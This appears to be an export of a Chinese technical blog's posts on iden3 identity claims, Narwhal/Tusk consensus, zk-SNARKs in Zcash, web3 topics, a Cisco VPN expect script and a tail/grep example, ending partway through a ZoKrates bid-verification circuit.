<h1 id="Round7-要点回顾"><a href="#Round7-要点回顾" class="headerlink" title="Round7: 要点回顾"></a>Round7: 要点回顾</h1><p>本文中，介绍了iden3的应用、原理、源码。现在来回顾一下全文的要点。</p>
<p>在iden3中，实现了“issuer给holder发claim，holder选择性地披露claim的一些性质给verifier”这样一个标注你的did故事；</p>
<p>每一个身份都有三棵树构成，claims树包括发行或者接收的claim；revocation tree包含被撤销的claim；roots of root tree记录每次claims树根的变动。三棵树均采用SMT，SMT用于提供不存在性的证明，这对revocation tree很重要，可用于提供未撤销证明。三棵树的树根拼起来的哈希，就构成了身份的当前状态，该状态不定时地同步到链上。身份初始情况下都包含一个auth claim，它包含了babyjubjub公钥。而初始情况下的身份状态，决定了它的id。</p>
<p>每个claim有8个插槽，其中4个是索引槽，4个是值槽。索引槽位决定了claim在claims tree中的位置；claim中既包括“数据主体”“过期时间”这样的元数据信息，又允许用户自己填写所需数据。数据的格式被称为schema，这是一个jsonld文件，它的哈希值也被嵌入到schema中。</p>
<p>iden3支持claim的发行、撤销等能力。每当发行或接受一个claim时，它被私有地存放到claims树中；而若撤销时，revocation tree将公开地将对应revocaiton nonce位置标记上这个claim。</p>
<p>当要证明身份或者提供proof时，prover通常要除了提供自己claim在claims树中的证明，还要提供在自己这里的未撤销证明，还有在issuer那里的未撤销证明。这也意味着，issuer有权力撤销自己发放的claim。证明以zk的形式进行，验证者需要验证zk本身数据的自洽性，典型地包括使用auth claim验证签名，还有输入的用户状态根和三棵树恢复出的状态根一致；此外还要验证公开输入的有效性，例如校验用户状态根和链上记录的一致。</p>
<p>如果要披露一个claim的属性，除了提供上述claim本身的有效性证明，还可通过ZKL形式，提供相关的操作符和输入，包括等于、大于、小于、IN、NOT IN这几种常见的操作，真正实现了选择性披露。</p>
<p>最后，Iden3还基于这些基础构件，提出了一套基于Iden3的身份认证协议，Prover通过Verifier所要求的认证方式调用Verifier的回调发送zk proof，以提供对自己did的证明，在认证通过后可以获取token，或者像polygonID那样，将Provder的did嵌入claim、并发放claim。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>官方文档：<br><a href="https://docs.iden3.io/protocol/spec/#properties">https://docs.iden3.io/protocol/spec/#properties</a></p>
<p>代码仓库：<br><a href="https://github.com/iden3">https://github.com/iden3</a></p>
<p>polygonID：<br><a href="https://issuer-ui.polygonid.me/">https://issuer-ui.polygonid.me/</a><br>user-ui / password-ui</p>
<p>其他文档：<br><a href="https://eprint.iacr.org/2019/458.pdf">https://eprint.iacr.org/2019/458.pdf</a><br><a href="https://medium.com/zokrates/efficient-ecc-in-zksnarks-using-zokrates-bd9ae37b8186">https://medium.com/zokrates/efficient-ecc-in-zksnarks-using-zokrates-bd9ae37b8186</a><br><a href="https://z.cash/technology/jubjub/">https://z.cash/technology/jubjub/</a><br><a href="https://eips.ethereum.org/EIPS/eip-2494#specificationhttps://github.com/iden3/iden3-docs/blob/master/source/docs/Baby-Jubjub.pdf">https://eips.ethereum.org/EIPS/eip-2494#specificationhttps://github.com/iden3/iden3-docs/blob/master/source/docs/Baby-Jubjub.pdf</a></p>
]]></content>
      <tags>
        <tag>DID</tag>
      </tags>
  </entry>
  <entry>
    <title>Start the CISCO VPN client from the command line</title>
    <url>/2021/03/24/start_cisco_vpn_from_command_line/</url>
    <content><![CDATA[<p>python gitst</p>
<p><a href="https://gist.github.com/alecthegeek/62b340ecb1480326eee1a13252ea83bb">https://gist.github.com/alecthegeek/62b340ecb1480326eee1a13252ea83bb</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env expect -f</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the CISCO VPN client on a Mac. Adapted from</span></span><br><span class="line"><span class="comment"># https://blog.felipe-alfaro.com/2014/05/23/automating-cisco-anyconnect-secure-mobility-client-on-mac-os-x/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> HOSTNAME vpn.server.com</span><br><span class="line"><span class="built_in">set</span> USER_NAME user.name</span><br><span class="line"><span class="built_in">set</span> PASSWORD password</span><br><span class="line"></span><br><span class="line">spawn /opt/cisco/anyconnect/<span class="built_in">bin</span>/vpn</span><br><span class="line"></span><br><span class="line">expect &#123;</span><br><span class="line">  <span class="string">&quot;state: Connected&quot;</span> &#123; send disconnect\n ; exp_continue; sleep <span class="number">3</span> &#125;</span><br><span class="line">  <span class="string">&quot;state: Disconnected&quot;</span>  &#123;sleep <span class="number">2</span>;send <span class="string">&quot;connect $HOSTNAME\n&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expect -timeout <span class="number">60</span> -re <span class="string">&quot;Username: .+] &quot;</span>; send $USER_NAME\n</span><br><span class="line">expect <span class="string">&quot;Password: &quot;</span> ; send $PASSWORD\n</span><br><span class="line">expect <span class="string">&quot;state: Connected&quot;</span>; sleep <span class="number">2</span>; send exit\n</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>startup-product-20220917</title>
    <url>/2022/09/17/startup-product-20220917/</url>
    <content><![CDATA[<p>学习国内黑客松大赛，分析目前 web3 创业项目分类。</p>
<ol>
<li><p><strong>DAO社区</strong></p>
<p>1.1 Discord-2D游戏-社区，将 Discord 新人加入的过程游戏化。<br>1.2 Crypto Bless社区，给亲人朋友赠送 NFT，FT。</p>
</li>
<li><p><strong>存储</strong></p>
<p>2.1 将IPFS，Filecoin存储协议增强为 S3 接口协议。</p>
</li>
<li><p><strong>DID</strong></p>
<p>3.1 DID wallet，展示个人信息（e.g. 姓名/年龄/地址），NTF形式展示 SBT（门票/社区会员），ZKP以及验证。<br>3.2 DID Reputation，true-ownership（个人金融评分，教育经历，社交凭证，专业能力-blockhat），Reward&amp;Punishment 奖惩机制（认证节点 —&gt; 发型，认证，检举，惩罚，对认证节点进行分级，早期邀请背调公司作为高级认证节点），辅助以 AI 技术对流程进行作弊发现。应用于Token精准airdrop，lending，联合其他DID-SBT。</p>
</li>
<li><p><strong>NFT</strong></p>
<p>4.1 数字藏品NFT拍卖市场。由湖南广电，阿里巴巴，网易云联合推出。e.g. 非遗文化藏品，圆明园十二生肖虎头形象。</p>
</li>
<li><p><strong>Metaverse</strong></p>
<p>5.1 与Decentraland高度类似。VR land，创作者可以创建NFT / FT。<br>5.2 智能室内设计。社内设计NFT —&gt; 创作 —&gt; 出版 —&gt; 交易，如上循环♻️。加以 AI 技术，图片处理技术，进行设计风格转化。利用区块链进行版权保护（IPFS），并交易。<br>5.3 SonarMeta为众筹者（创作蓝图），3D模型创作者（NFT-数字形象），游戏创作者（游戏引擎，游戏情节），广告商（如CoCaCola），提供了创作，交易以及经济分润的平台。<br>5.4 数字虚拟人。将真人舞蹈，面部表情，五官动作实时转化为虚拟人物跳舞，表情。可以为直播，VR游戏提供解决方案。</p>
</li>
<li><p><strong>Marketing</strong></p>
<p>6.1 数字资产服务商。1）价格分析，市场分析；2）价格指标，因素建议，时间建议；3）高频交易API，市场做市商，自动交易机器人。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>sui_consensus-Narwhal_and_Tusk</title>
    <url>/2022/08/28/sui_consensus-Narwhal_and_Tusk/</url>
    <content><![CDATA[<p>sui - <a href="https://github.com/MystenLabs/sui">https://github.com/MystenLabs/sui</a></p>
<p>Narwhal consensus - <a href="https://github.com/MystenLabs/narwhal">https://github.com/MystenLabs/narwhal</a></p>
<p>Narwhal and Tusk consensus paper - <a href="https://dl.acm.org/doi/10.1145/3492321.3519594">https://dl.acm.org/doi/10.1145/3492321.3519594</a></p>
<h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p>Narwhal and Tusk拥有一个更好的交易内存池，可靠地分配交易，是高性能分类账的关键推动者。 它应该完全从共识协议中分离出来，让共识只剩下订购小型的固定大小的参考工作。 这导致整个系统的吞吐量在很大程度上不受共识吞吐量的影响。</p>
<p><img src="/2022/08/28/sui_consensus-Narwhal_and_Tusk/1.png"></p>
<h3 id="Narwhal-的设计理念"><a href="#Narwhal-的设计理念" class="headerlink" title="Narwhal 的设计理念"></a>Narwhal 的设计理念</h3><p>在本节中，我们将这一基本设计逐步扩展到独角鲸，以（i）在领导者提出块时减少双重传输的需求，以及（ii）在有更多资源可用时实现横向扩展。</p>
<ol>
<li>第一步是<strong>广播块</strong>而不是交易，并让领导者提出一个块的哈希，依靠 Mempool 层提供其完整性保护的内容。 然而，验证者还需要确保哈希代表可用块，要求他们在验证块之前下载它们——在共识算法的关键路径内。</li>
<li>为确保可用性，作为第二步，持续广播该块，从而生成该块可供下载的证书。领导者提出一个简短的证书，证明该块将可用。但是，每个 Mempool 块必须包含一个证书，如果共识暂时失去活性，那么要提交的证书数量可能会无限增长。</li>
<li>第三步，添加<strong>因果关系</strong>，<strong>为多个 Mempool 块提出单一证书</strong>：Mempool 块包括来自所有验证者的过去 Mempool 块的证书。 因此，证书指的是一个区块及其完整的因果历史。 因此，提议这种固定大小证书的领导者提议对包含其完整历史中的块的序列进行扩展。 这种设计非常节省领导者的带宽，并确保达成共识的延迟会影响延迟，但不会影响平均吞吐量——因为内存池块会继续产生并最终提交。 尽管如此，仍然存在两个问题：（i）一个非常快的验证器可能会通过高速生成块来迫使其他人执行大量下载； (ii) 诚实的验证者可能没有足够的带宽与他人分享他们的区块——导致潜在的审查。</li>
<li>第四步通过对区块创建率施加限制来提供链质量。来自验证者的每个区块都包含一个<strong>轮数</strong>，并且必须包含来自<strong>上一轮的证书的法定人数</strong>才能有效。结果，一小部分诚实验证者的区块被包含在任何提案中。此外，在一些诚实的人结束上一轮之前，验证人无法进入内存池轮次，从而防止假交易泛滥。因此，Narwhal 提供了共识层的抗审查性（如 HoneyBadger BFT 中所定义），而无需使用任何额外的机制，例如阈值加密。因此，Narwhal-Hotstuff 系统是唯一提供抗审查性的基于部分同步仲裁的协议。对手无法杀死领导人，因为它不喜欢该提案，因为所有提案都包含至少 50% 的诚实交易，即使是来自拜占庭领导人的交易。</li>
<li>最后的第五个设计步骤是启用横向扩展。每个验证者的多个工作（worker）机器可以共享 Mempool 子块，而不是让单个机器创建 Mempool 块，称为批次-batches。一个主工作者在 Mempool 主块中集成对它们的引用。这使验证者能够将大量计算、存储和网络资源用于共享事务的任务——允许准线性扩展。</li>
</ol>
<h3 id="Narwhal-的设计核心"><a href="#Narwhal-的设计核心" class="headerlink" title="Narwhal 的设计核心"></a>Narwhal 的设计核心</h3><ol>
<li>The Narwhal Mempool - Narwhal 交易池</li>
</ol>
<p><img src="/2022/08/28/sui_consensus-Narwhal_and_Tusk/2.png"></p>
<ol start="2">
<li>使用 Narwhal 达成共识</li>
</ol>
<p>Narwhal-Hotstuff 算法/机制中，leader 领导者可以提议一个或多个在 Narwhal 创建的可用性证书，而不是提议一个交易块。提交时，证书的完整未提交因果历史被确定地排序和提交。Narwhal 保证在给定证书的情况下，所有验证者都会看到相同的因果历史，这本身就是区块上的 DAG。因此，该 DAG 上的任何确定性规则都会导致所有验证者的区块总排序相同，从而达成共识。此外，由于 Narwhal 的可用性属性，所有已提交的块都可以被检索和交易排序。</p>
<p>与直接发送交易块相比，使用独角鲸的领导者有很多优势。即使在没有失败的情况下，广播交易的领导者也会导致资源使用不均：轮领导者必须使用大量的带宽，而其他每个验证者的带宽都没有得到充分利用。相比之下，Narwhal 可确保始终高效、均匀地共享批量交易信息，从而提高网络利用率和吞吐量。</p>
<p><img src="/2022/08/28/sui_consensus-Narwhal_and_Tusk/4.png"></p>
<p>最终同步的共识协议不能在异步期间或领导者是拜占庭时提供正确共识。因此，在简单的内存池实现中，总体共识吞吐量在此期间变为零。相比之下，即使在异步网络下，Narwhal 也会继续共享区块并形成可用性证书，因此区块始终以最大吞吐量进行认证。一旦共识协议设法提交摘要-digest hash，验证者也会提交其因果历史，在异步期间没有间隙。尽管如此，最终同步的协议在异步期间仍然会失去正确共识，从而导致延迟增加。 我们展示了如何用 Tusk 克服这个问题。</p>
<p><img src="/2022/08/28/sui_consensus-Narwhal_and_Tusk/3.png"></p>
<p><img src="/2022/08/28/sui_consensus-Narwhal_and_Tusk/5.png"></p>
<p><img src="/2022/08/28/sui_consensus-Narwhal_and_Tusk/6.png"></p>
<h3 id="个人观点"><a href="#个人观点" class="headerlink" title="个人观点"></a>个人观点</h3><ol>
<li>Narwhal 设计 Mempool，从架构角度来看，实际上是数据提交过程中的一个阶段，配合上 Hotstuff 的3阶段数据提交，可以认为Narwhal 实际上是一个 4 阶段提交的共识机制。在实际上线mainnet之后，理论上比 tendermint 的 per transaction delay time 要长；吞吐量会大幅增长。目前Cosmos Hub区块链上共有342个验证者，有效验证人150，平均区块时间7.29秒，理论上 10,000 TPS。</li>
<li>对有人提出，将 <a href="https://www.paradigm.xyz/2022/07/experiment-narwhal-bullshark-cosmos-stack">Narwhal + EVM</a> 的<a href="https://github.com/gakonst/narwhal-abci-evm">观点</a>，本人并不认同：因为在 EVM 中，Smart Contract 之间是可以调用的，但是 Narwhal 的 Mempool 无法认知其关联关系，导致共识机制无法正确地对交易进行排序。而 Move 在变成语言层面对智能合约的状态进行隔离，不存在上述 EVM 中的问题。</li>
</ol>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>Move 相比 Solidity 的三大优势 - <a href="https://mirror.xyz/snapfingersdao.eth/0MExjukNkgMfaIl5FiI87DeCfaeONy_ameYULkiAeNA">https://mirror.xyz/snapfingersdao.eth/0MExjukNkgMfaIl5FiI87DeCfaeONy_ameYULkiAeNA</a></p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>tail 命令使用</title>
    <url>/2012/06/08/tail-%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>UNIX/Linux用户在系统或者应用中触发动作，想要看到针对动作的实时log，这个时候tail命令正是可以一展身手的时候了。</p>
<p>例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tail -f sci.log.D20120224.T000000 | grep -v getCommonCodeList | grep -v getRuleDetails | grep -v getExceptionList | grep zhuangwm | grep <span class="string">&quot;Invoking api Method:&quot;</span></span><br></pre></td></tr></table></figure>
<p>tail —用于输出文件的最后10行信息的内容。-f  是指当文件长度增长的时候，输出文件增长的部分。<br>sci.log.D20120224.T000000 —被搜索的文件名称。<br>|  —是指管道，用于将前面的输出作为输入到后面的命令中<br>grep -v getCommonCodeList —是查找文件里符合条件的字符串。 -v 是指反转查找，用于排除所列出来的文字对象</p>
]]></content>
  </entry>
  <entry>
    <title>web3.0是什么</title>
    <url>/2022/08/31/web3.0%E6%98%AF%E4%BB%80%E4%B9%88/</url>
    <content><![CDATA[<p><a href="https://zh.wikipedia.org/w/index.php?title=Gavin_Wood&action=edit&redlink=1">Gavin Wood</a>于2014年提出，Web3 概念。原文 - <a href="https://web3.foundation/about/">a decentralized and fair internet where users control their own data, identity and destiny</a>.</p>
<p>但实际上，到底什么是 Web3 目前尚无定论，个人思考，Web 3 在向着如下方向发展演进：</p>
<ul>
<li>数据方向 - 网络转提供数据库，如 IPFS，甚至直接 host server 于其上。</li>
<li>人工智能方向 - 网络提供智能机器（人），目前尚无此类服务实例。</li>
<li>3D方向 - 即 VR / AR 方向，标志产品需要等待苹果的 VR 产品落地。</li>
<li>去中心化方向 - 即区块链方向，强调将用户的 数据 / 控制权 还给用户，且在陌生人之间更加容易建立信任与协作。</li>
</ul>
]]></content>
      <tags>
        <tag>web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>zkSNARKs与zcash</title>
    <url>/2018/03/21/zkSNARKs%E4%B8%8Ezcash/</url>
    <content><![CDATA[<h3 id="什么是zk-SNARKs？"><a href="#什么是zk-SNARKs？" class="headerlink" title="什么是zk-SNARKs？"></a>什么是zk-SNARKs？</h3><p>Zcash是zk-SNARKs的第一个广泛应用，它是一种零知识密码学的新形式。Zcash的隐私保证源于可以屏蔽交易，但仍可通过zk-SNARK证明在网络共识规则下验证为有效。</p>
<p>缩写zk-SNARK代表“Zero-Knowledge Succinct Non-Interactive Argument of Knowledge 零知识简明非交互式知识”，并且指向的证明构造可以证明拥有某些信息，例如，一个密钥，不泄露该信息的情况下，也不在证明者和验证者之间进行任何交互。</p>
<p>“零知识”证明允许一方（证明方 prover）向另一方（验证方 verifier）证明声明的内容是真实的，不泄露超出声明本身有效性的任何信息。例如，考虑使用随机数的散列，证明者可以说服验证者确实存在具有该散列值的数字，而不透露数字的内容是什么。</p>
<p>在零知识“知识证明”中，证明者可以说服验证者不仅知道该数字存在，而且他们实际上知道这样一个数字，且不透露关于数字的任何信息。</p>
<p>可以在几毫秒内验证“简洁”的零知识证明，即使对于非常大的程序的声明内容，验证长度也只有几百字节。在最初零知识协议中，证明者和验证者必须多次来回通信，但在“非交互式”结构中，证明者发送“证明”给验证者，“证明”由单个消息组成。目前，唯一已知的生成非交互式的，足够短的，以发布到区块链的零知识证明方法具有“初始设置阶段 initial setup phase”，此阶段生成在证明者和验证者之间共享的公共参考字符串。我们将这个公共参考字符串称为系统的公共参数。</p>
<p>如果有人能够获得用于生成这些参数的随机性秘密，他们将能够创建对验证者看起来有效的错误证明。对于Zcash来说，这意味着恶意方可能会制造假币。为了防止此情况，Zcash设计了由多方程序产生公众参数。要详细了解参数生成程序并查看为防止随机性问题而采取的预防措施（例如，计算机正在生成公共参数），请访问<a href="https://z.cash/technology/paramgen.html">Paramgen页面</a>。要了解有关参数生成协议背后的数学的更多信息，请阅读<a href="https://z.cash/blog/generating-zcash-parameters.html">博客文章</a>或<a href="https://github.com/zcash/mpc/blob/master/whitepaper.pdf">有关该主题的白皮书</a>。</p>
<h3 id="ZK-SNARKS如何在ZCASH中构建"><a href="#ZK-SNARKS如何在ZCASH中构建" class="headerlink" title="ZK-SNARKS如何在ZCASH中构建"></a>ZK-SNARKS如何在ZCASH中构建</h3><p>为了在Zcash中拥有零知识隐私，根据网络共识规则确定交易有效的函数必须返回交易是否有效，而不泄露其执行计算的任何信息。这是通过对zk-SNARKs中的一些网络共识规则进行编码完成的。在很高的层面上，zk-SNARKs首先将你想要证明的东西转化为关于知道某些代数方程解的等价形式。 </p>
<p>在下面的章节中，将简要介绍如何将用于确定有效交易的规则转换为方程，然后可以在候选解决方案上对方程进行评估，而不会向验证方程的当事方透露任何敏感信息。</p>
<p>计算 → 算术电路 → R1CS → QAP → zk-SNARK</p>
<p>将交易有效性函数转化为数学表示，第一步是将逻辑步骤分解为最小可能的操作，从而创建一个“算术电路”。 类似于一个布尔逻辑电路，其中一个程序被编译成离散的单个步骤，如AND，OR，NOT，当一个程序转换为一个算术电路时，它被分解为单个步骤，包括加法，减法， 乘法和除法（在特殊情况下，我们将避免使用除法）。</p>
<p>下面是计算表达式（a + b）*（b * c）的算术电路的例子：</p>
<p><img src="/2018/03/21/zkSNARKs%E4%B8%8Ezcash/1.png"></p>
<p>看着这样一个电路，我们可以将输入值a，b，c看作在输出线上从左到右的“行进”。我们的下一步是建立的一级约束系统 (Rank 1 Constraint System)，即R1CS，以检查这些值是否“行进正确”。在上图中，R1CS将确认，b和c进入的乘法门的值是 b*c。</p>
<p>在这个R1CS表示中，验证者必须检查许多约束条件 - 几乎每条线路都有一个约束条件。 （由于技术原因，事实证明，我们只能对乘法门引出的线路有所限制。）在2012年<a href="https://eprint.iacr.org/2012/215.pdf">关于该主题的论文</a>中，Gennaro，Gentry，Parno和Raykova提出了一种很好的方法来“将所有这些约束集中成一个” 。该方法使用称为二次算术程序（QAP）的电路表示。需要检查的单个约束在多项式之间而不是数字之间。多项式可能相当大，因为当多项式之间的身份不成立时，它将无法保持多数点。因此，您只需检查两个多项式是否在一个随机选择的点上匹配，以便以高概率正确验证证明。</p>
<p>如果证明者事先知道验证者选择检查哪一点，则他们可能能够制造无效的多项式，但仍然满足当时的身份。使用zk-SNARKs，复杂的数学技术（如同态加密和椭圆曲线配对）可用于“盲人式”评估多项式 - 即不知道哪个点正在评估。上面描述的公共参数用于确定将检查哪个点，且以加密形式，以便证明者和验证者都不知道公共参数是什么。</p>
<p>到目前为止的描述主要涉及如何获得“SNARKs”中的S和N - 如何获得短暂的，非交互式的单一消息证明 - 但尚未解决允许 “zk”（零知识）部分证明者维护其秘密投入的机密性。事实证明，在这个阶段，通过使证明者使用仍然满足所需身份的原始多项式的“随机偏移”，可以容易地添加“zk”部分。</p>
<p>有关Zcash中关于zk-SNARKs背后关键概念的深入解释，请参阅后面的博客文章。</p>
<p>Zcash使用 <a href="https://github.com/scipr-lab/libsnark">libsnark</a> 分支，这是一个用于zk-SNARKs的C++库。 您可以检查代码并了解更多关于在 <a href="https://github.com/zcash/libsnark">github</a> 上的实现。要深入了解 Zcash zk-SNARKs 的协议，请参阅 <a href="https://eprint.iacr.org/2013/279.pdf">Pinocchio协议</a> 的本文。</p>
<h3 id="ZK-SNARKS如何应用于创建屏蔽交易"><a href="#ZK-SNARKS如何应用于创建屏蔽交易" class="headerlink" title="ZK-SNARKS如何应用于创建屏蔽交易"></a>ZK-SNARKS如何应用于创建屏蔽交易</h3><p>在比特币中，通过链接发件人地址，收件人地址以及公共区块链上的输入和输出值来验证交易。 Zcash使用zk-SNARKs来证明有效交易的条件得到了满足，但没有透露任何有关地址或值的重要信息。 屏蔽交易的发件人构建了一个证据，以高概率显示：</p>
<blockquote>
<p>输入总和 等于 每个屏蔽转换的输出总和。</p>
<p>发件人证明他们拥有输入的私钥，赋予他们花费的权力。</p>
<p>输入的私钥与整个交易的签名链接起来，链接是加密的，则，交易不会被不知道这些私钥的人修改。</p>
</blockquote>
<p>另外，屏蔽交易必须满足下面描述的其他条件：</p>
<p>比特币跟踪(未花费的交易输出)UTXO，以确定哪些交易是可用的。 在Zcash中，UTXO的屏蔽等同物称为“承诺”，花费承诺包含暴露出“花费人”。 Zcash节点保留已经创建的所有承诺的清单以及所有已经暴露的花费人。承诺和无效值存储为散列值，以避免公开关于承诺的任何信息，或者哪些无效值与哪些承诺相关。</p>
<p>对于由屏蔽付款创建的每个新钞票，将公布一个承诺，其中包含以下内容的散列：</p>
<ul>
<li>钞票发送的地址</li>
<li>发送的金额</li>
<li>本钞票所特有的数字“rho”（稍后用于派生花费人）和一个随机数。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Commitment &#x3D; HASH(recipient address, amount, rho, r)</span><br></pre></td></tr></table></figure>

<p>当屏蔽交易被花费时，发件人使用他们的支出密钥来公布一个花费者，该花费者是来自尚未用过的现有承诺的唯一编号（“rho”）的hash，并提供零知识证明，证明他们有权花费它。 该散列必须不在花费清单中，花费清单在区块链的每个节点中保存。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nullifier &#x3D; HASH(spending key, rho)</span><br></pre></td></tr></table></figure>
<p>屏蔽交易的零知识证明证实，除了上面列出的条件外，以下认定也是正确的：</p>
<blockquote>
<p>对于每个输入，都存在明确的承诺。</p>
<p>花费者和钞票承诺计算正确。</p>
<p>输出钞票的花费者与任何其他钞票的花费者发生绝不会发生冲突。</p>
</blockquote>
<p>除了用于控制地址的支出密钥之外，Zcash还使用一组证明和验证密钥来创建和检查证明。这些密钥在上面讨论的公共参数程序中生成，并在Zcash网络中的所有参与者之间共享。对于每个屏蔽交易，发件人使用他们的证明密钥来生成他们的输入有效的证据。矿工通过使用验证密钥检查证明者的计算来检查被保护的交易遵循共识规则。Zcash证明生成的设计方式要求证明者事先做更多的工作，但它简化了验证，因此主要的计算工作被转移到交易的创建者（这就是为什么创建屏蔽Zcash事务可能会占用到40秒，同时验证事务有效仅需要几毫秒）。</p>
<p>Zcash的屏蔽交易的隐私依赖于标准的，经过验证的密码学（散列函数和流密码），但它增加了zk-SNARKs，与承诺和花费机制一起使用，允许屏蔽交易的发送者和接收者证明加密交易是有效的。其他为加密货币提供隐私的方法依赖于模糊交易之间的链接，但事实上Zcash交易可以存储在完全加密的区块链中，为加密货币应用程序开辟了新的可能性。加密交易使得各方可以享受公共区块链的好处，同时保护他们的隐私。计划的未来升级将允许用户根据自己的判断有选择地披露有关被屏蔽交易的信息。查看Zcash博客文章的近期未来，了解<a href="https://z.cash/blog/the-near-future-of-zcash.html">Zcash的未来计划</a>。</p>
<p>有关如何在Zcash中构建屏蔽事务的更深入解释，请参阅我们的博客文章，了解屏蔽地址之间的事务如何工作。有关当前Zcash协议的完整详细信息，请参阅我们的<a href="https://github.com/zcash/zips/blob/master/protocol/protocol.pdf">协议规范</a>。</p>
<h3 id="ZK-SNARKS的未来应用"><a href="#ZK-SNARKS的未来应用" class="headerlink" title="ZK-SNARKS的未来应用"></a>ZK-SNARKS的未来应用</h3><p>在Zcash中创建屏蔽交易只是zk-SNARKs许多可能应用中的一个例子。从理论上讲，您可以使用zk-SNARK来验证任何关系，而不会泄露输入或泄露信息。对复杂函数生成证明的计算量仍然过大，许多程序还不适用，但Zcash团队正在推动优化zk-SNARKs的界限，并且已经以更高效的实施方式开创了新局面。</p>
<p>就目前而言，Zcash的zk-SNARKs实现可以作为企业用例的<a href="https://z.cash/blog/zsl.html">零知识安全层</a>添加到任何现有的分布式分类帐解决方案中。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>zokrates-基于ethereum的zkp-II-进阶</title>
    <url>/2019/07/24/zokrates-%E5%9F%BA%E4%BA%8Eethereum%E7%9A%84zkp-II-%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<h3 id="Project-link-gt-https-github-com-WillZhuang-zkp-workshop-project"><a href="#Project-link-gt-https-github-com-WillZhuang-zkp-workshop-project" class="headerlink" title="Project link -&gt; https://github.com/WillZhuang/zkp-workshop-project"></a>Project link -&gt; <a href="https://github.com/WillZhuang/zkp-workshop-project">https://github.com/WillZhuang/zkp-workshop-project</a></h3><p>让我来 step by step 做介绍：</p>
<h4 id="1-编写关于-bid-case-的-code"><a href="#1-编写关于-bid-case-的-code" class="headerlink" title="1.编写关于 bid case 的 code"></a>1.编写关于 bid case 的 code</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/// This zksnark <span class="keyword">is</span> to be used to verify that an operator has choosen</span><br><span class="line">/// the lowest bid that was actually submitted by an approved supplier was choosen</span><br><span class="line">/// by the operator <span class="keyword">for</span> the work. For this proof of concept, we will structure the</span><br><span class="line">/// proof to use <span class="number">3</span> suppliers only.</span><br><span class="line"></span><br><span class="line">///    Inputs <span class="keyword">for</span> the SNARK</span><br><span class="line"></span><br><span class="line">///    PUBLIC FIELDS</span><br><span class="line">///    input_of_py: field[<span class="number">3</span>] public keys <span class="keyword">for</span> each supplier - should be EDDSA public keys</span><br><span class="line">///    *  A: Curve point. Public part of the key used to create S.</span><br><span class="line"></span><br><span class="line">///    PRIVATE FIELDS</span><br><span class="line">///    input_of_py: field[<span class="number">3</span>] actual bid <span class="keyword">from</span> each supplier</span><br><span class="line">///    input_of_py: Requires per each EDDSA signatures per supplier</span><br><span class="line">///    *  R: Curve point. Hidden version of the per-message nonce.</span><br><span class="line">///    *  S: Field element. Signature to be verified.</span><br><span class="line">///    input_of_py: a secret to aide <span class="keyword">in</span> building out the merkel tree of the results</span><br><span class="line"></span><br><span class="line">///    *  context: Curve parameters used to create S. Tells you which curve was used.</span><br><span class="line">///    The context can be generated <span class="keyword">from</span> the babyjubjub curve.</span><br><span class="line"></span><br><span class="line">///    Returns <span class="keyword">for</span> the SNARK</span><br><span class="line">///    <span class="keyword">return</span>: a merkel tree including...</span><br><span class="line">///    <span class="number">1.</span> private key of choosen supplier</span><br><span class="line">///    <span class="number">2.</span> secret</span><br><span class="line">///    <span class="number">3.</span> A: Curve point. Public part of the key used to create S.</span><br><span class="line"></span><br><span class="line">// In the vectors, the supplier order should be kept the same to compare/access (i.e. supplier one has first bid, supplier two second bid, etc.)</span><br><span class="line"></span><br><span class="line">//For signatures</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;ecc/babyjubjubParams.code&quot;</span> <span class="keyword">as</span> context</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;signatures/verifyEddsa.code&quot;</span> <span class="keyword">as</span> verifyEddsa</span><br><span class="line">//For unpacking bids correctly</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;utils/pack/unpack128.code&quot;</span> <span class="keyword">as</span> unpack128</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;utils/pack/pack128.code&quot;</span> <span class="keyword">as</span> pack128</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;utils/pack/nonStrictUnpack256.code&quot;</span> <span class="keyword">as</span> unpack256</span><br><span class="line">//For unpacking signatures correctly</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;utils/pack/pack128.code&quot;</span> <span class="keyword">as</span> pack128</span><br><span class="line">//For merkle tree - changed to padded</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;hashes/sha256/512bitPadded.code&quot;</span> <span class="keyword">as</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">private field[<span class="number">6</span>] R, \</span></span></span><br><span class="line"><span class="function"><span class="params"> field[<span class="number">6</span>] A, \</span></span></span><br><span class="line"><span class="function"><span class="params"> field[<span class="number">3</span>] S, \</span></span></span><br><span class="line"><span class="function"><span class="params"> private field secret, \</span></span></span><br><span class="line"><span class="function"><span class="params"> private field bidone, \</span></span></span><br><span class="line"><span class="function"><span class="params"> private field bidtwo, \</span></span></span><br><span class="line"><span class="function"><span class="params"> private field bidthree</span>) -&gt; (field[2]):</span></span><br><span class="line"></span><br><span class="line">//Since each message <span 